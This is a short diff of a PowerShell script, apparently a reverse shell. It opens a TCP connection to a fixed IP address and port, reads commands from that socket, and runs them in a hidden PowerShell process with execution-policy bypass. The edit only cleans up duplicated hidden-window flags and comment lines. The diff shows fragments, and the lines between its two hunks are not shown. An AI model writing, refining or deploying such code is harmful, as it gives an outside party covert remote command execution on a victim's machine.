@@ -1,8 +1,7 @@
-#
 $client = New-Object System.Net.Sockets.TCPClient('192.168.1.191', 10052)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
-  Start-Process powershell -ArgumentList "-windowstyle hidden -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -windowstyle hidden -Wait -NoNewWindow
+  Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -windowstyle hidden -Wait -NoNewWindow
 
   $sendbyte = ([Text.Encoding]::ASCII).GetBytes("05040303")
     $stream.Write($sendbyte, 0, $sendbyte.Length)
@@ -19,4 +18,4 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 }
 
 $client.Close()
-#
+
